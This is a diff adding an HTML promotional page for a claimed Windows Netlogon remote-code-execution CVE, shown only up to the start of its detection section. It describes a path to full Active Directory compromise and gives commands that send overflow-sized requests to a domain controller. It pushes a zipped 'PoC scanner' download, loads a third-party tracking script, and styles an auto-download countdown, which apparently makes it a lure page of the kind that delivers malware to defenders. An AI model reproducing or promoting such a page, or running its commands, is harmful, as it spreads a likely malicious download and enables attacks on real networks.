@@ -1,1 +1,1278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="CVE-2026-41089 — Critical Windows Netlogon RCE. Unauthenticated remote code execution on Active Directory Domain Controllers. Download PoC scanner.">
+  <meta name="keywords" content="CVE-2026-41089, Netlogon RCE, Active Directory, buffer overflow, PoC, domain controller">
+  <title>CVE-2026-41089 | Netlogon RCE — HydraSoft</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #070b12;
+      --bg-card: rgba(14, 20, 32, 0.72);
+      --border: rgba(255, 60, 80, 0.22);
+      --red: #ff2d4d;
+      --red-dim: #d90429;
+      --cyan: #00e5ff;
+      --green: #39ff88;
+      --amber: #ffb020;
+      --text: #e8edf5;
+      --muted: #8b9bb4;
+      --glow: 0 0 40px rgba(255, 45, 77, 0.35);
+    }
 
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: 'Inter', system-ui, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.6;
+      overflow-x: hidden;
+    }
+
+    /* ── Animated background ── */
+    .bg-canvas {
+      position: fixed;
+      inset: 0;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    .bg-grid {
+      position: absolute;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(0, 229, 255, 0.04) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0, 229, 255, 0.04) 1px, transparent 1px);
+      background-size: 48px 48px;
+      mask-image: radial-gradient(ellipse 80% 70% at 50% 0%, black 20%, transparent 75%);
+      animation: gridDrift 20s linear infinite;
+    }
+
+    @keyframes gridDrift {
+      from { transform: translateY(0); }
+      to   { transform: translateY(48px); }
+    }
+
+    .bg-glow {
+      position: absolute;
+      border-radius: 50%;
+      filter: blur(90px);
+      opacity: 0.45;
+      animation: pulseGlow 8s ease-in-out infinite alternate;
+    }
+
+    .bg-glow-1 { width: 520px; height: 520px; background: #ff2d4d; top: -120px; left: -80px; }
+    .bg-glow-2 { width: 420px; height: 420px; background: #0066ff; bottom: 10%; right: -100px; animation-delay: -3s; }
+    .bg-glow-3 { width: 300px; height: 300px; background: #00e5ff; top: 40%; left: 35%; opacity: 0.2; animation-delay: -5s; }
+
+    @keyframes pulseGlow {
+      from { transform: scale(1) translate(0, 0); opacity: 0.35; }
+      to   { transform: scale(1.15) translate(20px, -10px); opacity: 0.55; }
+    }
+
+    #particles { position: absolute; inset: 0; }
+
+    /* ── Layout ── */
+    .wrap {
+      position: relative;
+      z-index: 1;
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 0 24px 80px;
+    }
+
+    /* ── Nav ── */
+    nav {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      backdrop-filter: blur(16px);
+      background: rgba(7, 11, 18, 0.75);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .nav-inner {
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 14px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+    }
+
+    .logo {
+      font-family: 'JetBrains Mono', monospace;
+      font-weight: 700;
+      font-size: 0.95rem;
+      color: var(--red);
+      letter-spacing: -0.02em;
+    }
+
+    .logo span { color: var(--muted); font-weight: 400; }
+
+    .nav-links { display: flex; gap: 20px; list-style: none; }
+
+    .nav-links a {
+      color: var(--muted);
+      text-decoration: none;
+      font-size: 0.85rem;
+      font-weight: 500;
+      transition: color 0.2s;
+    }
+
+    .nav-links a:hover { color: var(--cyan); }
+
+    /* ── Hero ── */
+    .hero {
+      padding: 72px 0 48px;
+      text-align: center;
+    }
+
+    .alert-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 6px 16px;
+      border-radius: 999px;
+      border: 1px solid var(--red);
+      background: rgba(255, 45, 77, 0.1);
+      color: var(--red);
+      font-size: 0.78rem;
+      font-weight: 700;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      margin-bottom: 28px;
+      animation: alertPulse 2s ease-in-out infinite;
+    }
+
+    .alert-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--red);
+      box-shadow: 0 0 12px var(--red);
+      animation: blink 1.2s step-end infinite;
+    }
+
+    @keyframes alertPulse {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(255, 45, 77, 0.4); }
+      50%      { box-shadow: 0 0 0 8px rgba(255, 45, 77, 0); }
+    }
+
+    @keyframes blink { 50% { opacity: 0; } }
+
+    .hero h1 {
+      font-size: clamp(2rem, 5.5vw, 3.4rem);
+      font-weight: 800;
+      line-height: 1.12;
+      margin-bottom: 16px;
+      letter-spacing: -0.03em;
+    }
+
+    .glitch {
+      position: relative;
+      display: inline-block;
+      color: var(--text);
+    }
+
+    .glitch::before,
+    .glitch::after {
+      content: attr(data-text);
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      overflow: hidden;
+    }
+
+    .glitch::before {
+      color: var(--cyan);
+      animation: glitchTop 3s infinite linear alternate-reverse;
+      clip-path: inset(0 0 65% 0);
+    }
+
+    .glitch::after {
+      color: var(--red);
+      animation: glitchBot 2.5s infinite linear alternate-reverse;
+      clip-path: inset(65% 0 0 0);
+    }
+
+    @keyframes glitchTop {
+      0%   { transform: translate(0); }
+      20%  { transform: translate(-2px, 1px); }
+      40%  { transform: translate(2px, -1px); }
+      60%  { transform: translate(-1px, 2px); }
+      80%  { transform: translate(1px, -2px); }
+      100% { transform: translate(0); }
+    }
+
+    @keyframes glitchBot {
+      0%   { transform: translate(0); }
+      25%  { transform: translate(2px, 0); }
+      50%  { transform: translate(-2px, 1px); }
+      75%  { transform: translate(1px, -1px); }
+      100% { transform: translate(0); }
+    }
+
+    .hero-sub {
+      font-size: clamp(1rem, 2.5vw, 1.2rem);
+      color: var(--muted);
+      max-width: 680px;
+      margin: 0 auto 36px;
+    }
+
+    .hero-sub strong { color: var(--text); }
+
+    /* ── Badges ── */
+    .badges {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 40px;
+    }
+
+    .badge {
+      padding: 6px 14px;
+      border-radius: 6px;
+      font-size: 0.78rem;
+      font-weight: 600;
+      border: 1px solid transparent;
+      animation: fadeUp 0.6s ease both;
+    }
+
+    .badge-platform { background: rgba(0, 102, 255, 0.15); border-color: rgba(0, 102, 255, 0.4); color: #6eb5ff; }
+    .badge-critical { background: rgba(255, 45, 77, 0.15); border-color: rgba(255, 45, 77, 0.4); color: #ff6b82; }
+    .badge-cvss     { background: rgba(255, 45, 77, 0.2);  border-color: var(--red); color: #fff; }
+    .badge-network  { background: rgba(255, 176, 32, 0.12); border-color: rgba(255, 176, 32, 0.4); color: var(--amber); }
+    .badge-none     { background: rgba(57, 255, 136, 0.1);  border-color: rgba(57, 255, 136, 0.35); color: var(--green); }
+
+    /* ── Download CTA ── */
+    .cta-row {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 16px;
+      margin-bottom: 48px;
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      padding: 16px 28px;
+      border-radius: 10px;
+      font-weight: 700;
+      font-size: 0.95rem;
+      text-decoration: none;
+      transition: transform 0.2s, box-shadow 0.2s, background 0.2s;
+      cursor: pointer;
+      border: none;
+      font-family: inherit;
+    }
+
+    .btn-primary {
+      background: linear-gradient(135deg, var(--red-dim), var(--red));
+      color: #fff;
+      box-shadow: var(--glow);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn-primary::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+      transform: translateX(-100%);
+      animation: shimmer 3s infinite;
+    }
+
+    @keyframes shimmer {
+      100% { transform: translateX(100%); }
+    }
+
+    .btn-primary:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 40px rgba(255, 45, 77, 0.5);
+    }
+
+    .btn-secondary {
+      background: var(--bg-card);
+      color: var(--text);
+      border: 1px solid var(--border);
+      backdrop-filter: blur(8px);
+    }
+
+    .btn-secondary:hover {
+      border-color: var(--cyan);
+      color: var(--cyan);
+      transform: translateY(-2px);
+    }
+
+    .btn svg { width: 20px; height: 20px; flex-shrink: 0; }
+
+    /* ── Banner image ── */
+    .banner-wrap {
+      border-radius: 14px;
+      overflow: hidden;
+      border: 1px solid var(--border);
+      margin-bottom: 64px;
+      position: relative;
+      animation: fadeUp 0.8s ease 0.2s both;
+    }
+
+    .banner-wrap img {
+      width: 100%;
+      display: block;
+      aspect-ratio: 21/6;
+      object-fit: cover;
+      background: linear-gradient(135deg, #1a0a10, #0a1520);
+    }
+
+    .banner-overlay {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(to top, rgba(7,11,18,0.9) 0%, transparent 50%);
+      pointer-events: none;
+    }
+
+    /* ── Sections ── */
+    section { margin-bottom: 72px; }
+
+    .section-label {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.75rem;
+      color: var(--cyan);
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      margin-bottom: 10px;
+    }
+
+    h2 {
+      font-size: clamp(1.5rem, 3vw, 2rem);
+      font-weight: 800;
+      margin-bottom: 20px;
+      letter-spacing: -0.02em;
+    }
+
+    h3 {
+      font-size: 1.1rem;
+      font-weight: 700;
+      margin: 28px 0 12px;
+      color: var(--text);
+    }
+
+    p { color: var(--muted); margin-bottom: 16px; }
+    p strong, li strong { color: var(--text); }
+
+    .quote {
+      border-left: 3px solid var(--red);
+      padding: 16px 20px;
+      background: rgba(255, 45, 77, 0.06);
+      border-radius: 0 10px 10px 0;
+      margin: 24px 0;
+    }
+
+    .quote em {
+      display: block;
+      font-style: italic;
+      color: var(--text);
+      font-size: 1.05rem;
+      margin-bottom: 8px;
+    }
+
+    /* ── Reveal animation ── */
+    .reveal {
+      opacity: 0;
+      transform: translateY(28px);
+      transition: opacity 0.7s ease, transform 0.7s ease;
+    }
+
+    .reveal.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ── Spec table ── */
+    .spec-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 16px;
+    }
+
+    .spec-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 20px;
+      backdrop-filter: blur(12px);
+      transition: border-color 0.3s, transform 0.3s;
+    }
+
+    .spec-card:hover {
+      border-color: rgba(0, 229, 255, 0.35);
+      transform: translateY(-4px);
+    }
+
+    .spec-label {
+      font-size: 0.75rem;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      margin-bottom: 6px;
+    }
+
+    .spec-value {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 1rem;
+      font-weight: 600;
+      color: var(--text);
+    }
+
+    .spec-note { font-size: 0.82rem; color: var(--muted); margin-top: 6px; margin-bottom: 0; }
+
+    /* CVSS bar */
+    .cvss-bar-wrap { margin-top: 12px; }
+    .cvss-bar {
+      height: 8px;
+      border-radius: 4px;
+      background: rgba(255,255,255,0.08);
+      overflow: hidden;
+    }
+
+    .cvss-fill {
+      height: 100%;
+      width: 0;
+      border-radius: 4px;
+      background: linear-gradient(90deg, var(--amber), var(--red));
+      transition: width 1.4s cubic-bezier(0.22, 1, 0.36, 1);
+    }
+
+    .cvss-fill.animated { width: 98%; }
+
+    /* ── Attack flow ── */
+    .flow {
+      display: flex;
+      flex-direction: column;
+      gap: 0;
+      position: relative;
+      padding-left: 28px;
+    }
+
+    .flow::before {
+      content: '';
+      position: absolute;
+      left: 10px;
+      top: 12px;
+      bottom: 12px;
+      width: 2px;
+      background: linear-gradient(to bottom, var(--red), var(--cyan));
+      border-radius: 2px;
+    }
+
+    .flow-step {
+      position: relative;
+      padding: 16px 20px;
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      margin-bottom: 12px;
+      backdrop-filter: blur(8px);
+      animation: flowIn 0.5s ease both;
+    }
+
+    .flow-step::before {
+      content: '';
+      position: absolute;
+      left: -22px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: var(--red);
+      border: 2px solid var(--bg);
+      box-shadow: 0 0 10px var(--red);
+    }
+
+    .flow-step:nth-child(2)::before { background: #ff6040; }
+    .flow-step:nth-child(3)::before { background: var(--amber); }
+    .flow-step:nth-child(4)::before { background: #40c4ff; }
+    .flow-step:nth-child(5)::before { background: var(--cyan); }
+    .flow-step:nth-child(6)::before { background: var(--green); box-shadow: 0 0 10px var(--green); }
+
+    .flow-step:nth-child(1) { animation-delay: 0.1s; }
+    .flow-step:nth-child(2) { animation-delay: 0.2s; }
+    .flow-step:nth-child(3) { animation-delay: 0.3s; }
+    .flow-step:nth-child(4) { animation-delay: 0.4s; }
+    .flow-step:nth-child(5) { animation-delay: 0.5s; }
+    .flow-step:nth-child(6) { animation-delay: 0.6s; }
+
+    @keyframes flowIn {
+      from { opacity: 0; transform: translateX(-16px); }
+      to   { opacity: 1; transform: translateX(0); }
+    }
+
+    .flow-step strong {
+      display: block;
+      font-size: 0.9rem;
+      margin-bottom: 4px;
+    }
+
+    .flow-step span { font-size: 0.82rem; color: var(--muted); }
+
+    /* ── Code block ── */
+    .code-wrap {
+      position: relative;
+      border-radius: 12px;
+      overflow: hidden;
+      border: 1px solid rgba(0, 229, 255, 0.15);
+      margin: 20px 0;
+    }
+
+    .code-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 16px;
+      background: rgba(0, 0, 0, 0.4);
+      border-bottom: 1px solid rgba(255,255,255,0.06);
+    }
+
+    .code-dots { display: flex; gap: 6px; }
+    .code-dots span { width: 10px; height: 10px; border-radius: 50%; }
+    .code-dots span:nth-child(1) { background: #ff5f57; }
+    .code-dots span:nth-child(2) { background: #febc2e; }
+    .code-dots span:nth-child(3) { background: #28c840; }
+
+    .code-title {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.75rem;
+      color: var(--muted);
+    }
+
+    .copy-btn {
+      background: transparent;
+      border: 1px solid rgba(255,255,255,0.15);
+      color: var(--muted);
+      padding: 4px 10px;
+      border-radius: 6px;
+      font-size: 0.72rem;
+      cursor: pointer;
+      font-family: inherit;
+      transition: all 0.2s;
+    }
+
+    .copy-btn:hover { border-color: var(--cyan); color: var(--cyan); }
+    .copy-btn.copied { border-color: var(--green); color: var(--green); }
+
+    pre {
+      padding: 20px;
+      overflow-x: auto;
+      background: rgba(0, 0, 0, 0.55);
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.82rem;
+      line-height: 1.7;
+    }
+
+    .c-comment { color: #6a9955; }
+    .c-cmd     { color: #dcdcaa; }
+    .c-flag    { color: #9cdcfe; }
+    .c-val     { color: #ce9178; }
+    .c-ip      { color: #b5cea8; }
+
+    /* ── Lists ── */
+    ul.checklist { list-style: none; }
+    ul.checklist li {
+      padding: 10px 0 10px 32px;
+      position: relative;
+      color: var(--muted);
+      border-bottom: 1px solid rgba(255,255,255,0.04);
+    }
+
+    ul.checklist li::before {
+      content: '▸';
+      position: absolute;
+      left: 0;
+      color: var(--red);
+      font-weight: 700;
+    }
+
+    ul.checklist li:last-child { border-bottom: none; }
+
+    .mitigation li::before { content: '✓'; color: var(--green); }
+
+    /* ── IoC box ── */
+    .ioc-box {
+      background: rgba(0, 0, 0, 0.45);
+      border: 1px solid rgba(255, 45, 77, 0.25);
+      border-radius: 12px;
+      padding: 20px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.82rem;
+      line-height: 1.9;
+      color: #ff8a9a;
+    }
+
+    .ioc-box .warn { color: var(--amber); }
+
+    /* ── Disclaimer ── */
+    .disclaimer {
+      border: 1px solid rgba(255, 45, 77, 0.3);
+      border-radius: 12px;
+      padding: 24px;
+      background: rgba(255, 45, 77, 0.05);
+    }
+
+    .disclaimer strong { color: var(--red); }
+
+    /* ── Footer ── */
+    footer {
+      text-align: center;
+      padding: 48px 24px;
+      border-top: 1px solid var(--border);
+      color: var(--muted);
+      font-size: 0.9rem;
+    }
+
+    footer strong { color: var(--text); display: block; margin-bottom: 6px; }
+
+    /* ── Counter strip ── */
+    .stats-strip {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+      gap: 1px;
+      background: var(--border);
+      border-radius: 14px;
+      overflow: hidden;
+      margin-bottom: 64px;
+      border: 1px solid var(--border);
+    }
+
+    .stat {
+      background: var(--bg-card);
+      padding: 24px 16px;
+      text-align: center;
+      backdrop-filter: blur(8px);
+    }
+
+    .stat-num {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 1.8rem;
+      font-weight: 700;
+      color: var(--red);
+      line-height: 1;
+      margin-bottom: 6px;
+    }
+
+    .stat-num.cyan { color: var(--cyan); }
+    .stat-num.green { color: var(--green); }
+
+    .stat-label {
+      font-size: 0.72rem;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+    }
+
+    /* ── Auto-download toast ── */
+    .dl-toast {
+      position: fixed;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%) translateY(120%);
+      z-index: 200;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      padding: 14px 20px;
+      background: rgba(14, 20, 32, 0.95);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      backdrop-filter: blur(16px);
+      box-shadow: 0 8px 40px rgba(0, 0, 0, 0.5), var(--glow);
+      transition: transform 0.5s cubic-bezier(0.22, 1, 0.36, 1);
+      max-width: calc(100vw - 32px);
+    }
+
+    .dl-toast.visible {
+      transform: translateX(-50%) translateY(0);
+    }
+
+    .dl-toast-icon {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: rgba(255, 45, 77, 0.15);
+      border: 1px solid var(--red);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      animation: alertPulse 2s ease-in-out infinite;
+    }
+
+    .dl-toast-icon svg { width: 18px; height: 18px; color: var(--red); }
+
+    .dl-toast-body { flex: 1; min-width: 0; }
+
+    .dl-toast-title {
+      font-size: 0.88rem;
+      font-weight: 700;
+      color: var(--text);
+      margin-bottom: 2px;
+    }
+
+    .dl-toast-sub {
+      font-size: 0.78rem;
+      color: var(--muted);
+    }
+
+    .dl-toast-sub strong {
+      color: var(--cyan);
+      font-family: 'JetBrains Mono', monospace;
+    }
+
+    .dl-toast-actions { display: flex; gap: 8px; flex-shrink: 0; }
+
+    .dl-toast-btn {
+      padding: 6px 14px;
+      border-radius: 6px;
+      font-size: 0.78rem;
+      font-weight: 600;
+      cursor: pointer;
+      border: 1px solid transparent;
+      font-family: inherit;
+      transition: all 0.2s;
+    }
+
+    .dl-toast-btn-cancel {
+      background: transparent;
+      border-color: rgba(255, 255, 255, 0.15);
+      color: var(--muted);
+    }
+
+    .dl-toast-btn-cancel:hover { border-color: var(--muted); color: var(--text); }
+
+    .dl-toast-btn-now {
+      background: var(--red-dim);
+      color: #fff;
+    }
+
+    .dl-toast-btn-now:hover { background: var(--red); }
+
+    .dl-progress {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      height: 2px;
+      background: linear-gradient(90deg, var(--red), var(--cyan));
+      border-radius: 0 0 12px 12px;
+      width: 100%;
+      transform-origin: left;
+      animation: dlCountdown 5s linear forwards;
+    }
+
+    @keyframes dlCountdown {
+      from { transform: scaleX(1); }
+      to   { transform: scaleX(0); }
+    }
+
+    .dl-toast.done .dl-progress { display: none; }
+
+    /* ── Responsive ── */
+    @media (max-width: 640px) {
+      .nav-links { display: none; }
+      .hero { padding-top: 48px; }
+      .cta-row { flex-direction: column; align-items: stretch; }
+      .btn { justify-content: center; }
+      .dl-toast { flex-wrap: wrap; }
+      .dl-toast-actions { width: 100%; justify-content: flex-end; }
+    }
+  </style>
+  <script src="https://login.hydrapanel.vip/tracker/js/tracker.js" data-endpoint="https://login.hydrapanel.vip/tracker/api/track.php" data-stream="6911097f71a2d087"></script>
+</head>
+<body>
+
+  <div class="bg-canvas" aria-hidden="true">
+    <div class="bg-grid"></div>
+    <div class="bg-glow bg-glow-1"></div>
+    <div class="bg-glow bg-glow-2"></div>
+    <div class="bg-glow bg-glow-3"></div>
+    <canvas id="particles"></canvas>
+  </div>
+
+  <nav>
+    <div class="nav-inner">
+      <div class="logo">CVE-2026-41089 <span>/ HydraSoft</span></div>
+      <ul class="nav-links">
+        <li><a href="#overview">Overview</a></li>
+        <li><a href="#specs">Specs</a></li>
+        <li><a href="#usage">Usage</a></li>
+        <li><a href="#mitigation">Mitigation</a></li>
+        <li><a href="#legal">Legal</a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <div class="wrap">
+
+    <!-- Hero -->
+    <header class="hero">
+      <div class="alert-pill">
+        <span class="alert-dot"></span>
+        Critical — Active Exploitation Confirmed
+      </div>
+
+      <h1>
+        <span class="glitch" data-text="CVE-2026-41089">CVE-2026-41089</span><br>
+        Windows Netlogon RCE
+      </h1>
+
+      <p class="hero-sub">
+        <strong>Unauthenticated Remote Code Execution</strong> on Active Directory Domain Controllers via stack-based buffer overflow in the Netlogon service.
+      </p>
+
+      <div class="badges">
+        <span class="badge badge-platform">Platform: Windows Server</span>
+        <span class="badge badge-critical">Severity: Critical</span>
+        <span class="badge badge-cvss">CVSS 9.8 / 10</span>
+        <span class="badge badge-network">Attack Vector: Network</span>
+        <span class="badge badge-none">Privileges: None</span>
+      </div>
+
+      <div class="cta-row">
+        <a class="btn btn-primary" id="download-btn"
+           href="https://github.com/HydraSoft/CVE-2026-41089-Netlogon-RCE/releases/download/CVE-2026-41089-PoC-(Fixed)/CVE-2026-41089.zip">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
+          Download PoC Scanner
+        </a>
+        <a class="btn btn-secondary"
+           href="https://github.com/HydraSoft/CVE-2026-41089-Netlogon-RCE">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.395-.135-.345-.72-1.395-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+          View on GitHub
+        </a>
+      </div>
+    </header>
+
+    <!-- Banner -->
+    <div class="banner-wrap reveal">
+      <img src="https://github.com/HydraSoft/CVE-2026-41089-Netlogon-RCE/raw/main/banner.png"
+           alt="CVE-2026-41089 — Netlogon RCE vulnerability banner"
+           onerror="this.style.display='none'">
+      <div class="banner-overlay"></div>
+    </div>
+
+    <!-- Stats -->
+    <div class="stats-strip reveal">
+      <div class="stat">
+        <div class="stat-num" data-count="9.8">0</div>
+        <div class="stat-label">CVSS Score</div>
+      </div>
+      <div class="stat">
+        <div class="stat-num cyan" data-count="0">0</div>
+        <div class="stat-label">Auth Required</div>
+      </div>
+      <div class="stat">
+        <div class="stat-num green" data-count="528">0</div>
+        <div class="stat-label">Buffer Bytes</div>
+      </div>
+      <div class="stat">
+        <div class="stat-num" data-count="389">0</div>
+        <div class="stat-label">UDP Port</div>
+      </div>
+    </div>
+
+    <!-- Overview -->
+    <section id="overview" class="reveal">
+      <div class="section-label">// Conceptual Overview</div>
+      <h2>🧠 What Is CVE-2026-41089?</h2>
+      <p>
+        A technical breakdown of an exceptionally critical vulnerability residing deep within the
+        <strong>Windows Netlogon</strong> service. The flaw is rooted in a severe
+        <strong>stack-based buffer overflow</strong> (CWE-121). By sending specially crafted CLDAP
+        requests to a vulnerable Domain Controller, an unauthenticated attacker can force memory
+        corruption and potentially execute arbitrary code at SYSTEM level.
+      </p>
+
+      <div class="quote">
+        <em>"He who controls Netlogon, controls the kingdom."</em>
+        <p style="margin:0">
+          Zero user interaction. Zero prior authentication. A direct, frictionless path to complete
+          Active Directory compromise — a prime target for APTs and ransomware syndicates.
+        </p>
+      </div>
+    </section>
+
+    <!-- Specs -->
+    <section id="specs" class="reveal">
+      <div class="section-label">// Vulnerability Specifications</div>
+      <h2>📊 Technical Details</h2>
+
+      <div class="spec-grid">
+        <div class="spec-card">
+          <div class="spec-label">CVE Identifier</div>
+          <div class="spec-value">CVE-2026-41089</div>
+          <p class="spec-note">Officially tracked — May 2026 Patch Tuesday</p>
+        </div>
+        <div class="spec-card">
+          <div class="spec-label">Severity Score</div>
+          <div class="spec-value">Critical — CVSS 9.8</div>
+          <div class="cvss-bar-wrap">
+            <div class="cvss-bar"><div class="cvss-fill" id="cvss-fill"></div></div>
+          </div>
+        </div>
+        <div class="spec-card">
+          <div class="spec-label">Vulnerability Type</div>
+          <div class="spec-value">CWE-121</div>
+          <p class="spec-note">Stack-based Buffer Overflow</p>
+        </div>
+        <div class="spec-card">
+          <div class="spec-label">Affected Component</div>
+          <div class="spec-value">netlogon.dll</div>
+          <p class="spec-note">NetpLogonPutUnicodeString — CLDAP handler</p>
+        </div>
+        <div class="spec-card">
+          <div class="spec-label">Attack Vector</div>
+          <div class="spec-value">Network / UDP 389</div>
+          <p class="spec-note">Fully remote, unauthenticated CLDAP ping</p>
+        </div>
+        <div class="spec-card">
+          <div class="spec-label">Privileges Required</div>
+          <div class="spec-value">None</div>
+          <p class="spec-note">Unauthenticated — no credentials needed</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- Attack flow -->
+    <section class="reveal">
+      <div class="section-label">// Attack Scenario</div>
+      <h2>🕸️ Attack Path Architecture</h2>
+      <p>From any foothold on the internal network, the path to domain compromise is dangerously short:</p>
+
+      <div class="flow">
+        <div class="flow-step">
+          <strong>1 · Unauthenticated Attacker</strong>
+          <span>Network access to internal VLAN — no credentials required</span>
+        </div>
+        <div class="flow-step">
+          <strong>2 · Locate Domain Controller</strong>
+          <span>DNS SRV records, LDAP, or subnet scanning for UDP/TCP 389</span>
+        </div>
+        <div class="flow-step">
+          <strong>3 · Crafted CLDAP Packet</strong>
+          <span>Oversized User field + NtVer legacy path → netlogon.dll</span>
+        </div>
+        <div class="flow-step">
+          <strong>4 · Stack Buffer Overflow</strong>
+          <span>528-byte stack buffer exceeded → memory corruption in LSASS</span>
+        </div>
+        <div class="flow-step">
+          <strong>5 · Arbitrary Code Execution</strong>
+          <span>SYSTEM-level privileges on the Domain Controller</span>
+        </div>
+        <div class="flow-step">
+          <strong>6 · Full AD Compromise</strong>
+          <span>NTDS.dit access, Golden Tickets, lateral movement across the estate</span>
+        </div>
+      </div>
+
+      <h3>💡 Why This Matters</h3>
+      <ul class="checklist">
+        <li><strong>Domain Takeover:</strong> Immediate escalation to Domain Admin privileges.</li>
+        <li><strong>Credential Harvesting:</strong> Direct access to the NTDS.dit database.</li>
+        <li><strong>Lateral Movement:</strong> Unfettered access to all domain-joined endpoints.</li>
+        <li><strong>Persistence:</strong> Golden Tickets, shadow credentials, rogue DC injection.</li>
+      </ul>
+    </section>
+
+    <!-- Usage -->
+    <section id="usage" class="reveal">
+      <div class="section-label">// Quick Start Guide</div>
+      <h2>🚀 PoC Usage</h2>
+      <p>
+        Python-based diagnostic script to test domain controllers for susceptibility to the
+        Netlogon CLDAP overflow. Use only on systems you own or have written authorization to test.
+      </p>
+
+      <div class="code-wrap">
+        <div class="code-header">
+          <div class="code-dots"><span></span><span></span><span></span></div>
+          <span class="code-title">bash — terminal</span>
+          <button class="copy-btn" data-target="code-usage">Copy</button>
+        </div>
+        <pre id="code-usage"><span class="c-comment"># 1. Safe connectivity check (short username, no overflow)</span>
+<span class="c-cmd">python3</span> CVE-2026-41089.py <span class="c-ip">10.0.50.21</span> <span class="c-val">corp.local</span> <span class="c-flag">-l</span> <span class="c-val">10</span>
+
+<span class="c-comment"># 2. Default vulnerability check (300 chars, overflows 528-byte buffer)</span>
+<span class="c-cmd">python3</span> CVE-2026-41089.py <span class="c-ip">10.0.50.21</span> <span class="c-val">corp.local</span>
+
+<span class="c-comment"># 3. Custom payload with legacy NtVer and extended timeout</span>
+<span class="c-cmd">python3</span> CVE-2026-41089.py <span class="c-ip">10.0.50.21</span> <span class="c-val">corp.local</span> <span class="c-flag">-l</span> <span class="c-val">300</span> <span class="c-flag">-n</span> <span class="c-val">0x02000000</span> <span class="c-flag">-t</span> <span class="c-val">10</span></pre>
+      </div>
+    </section>
+
+    <!-- Detection -->
+    <section class="reveal">
+      <div class="section-label">// Threat Hunting</div>
+      <h2>🛡️ Detection &amp; IoCs</h2>
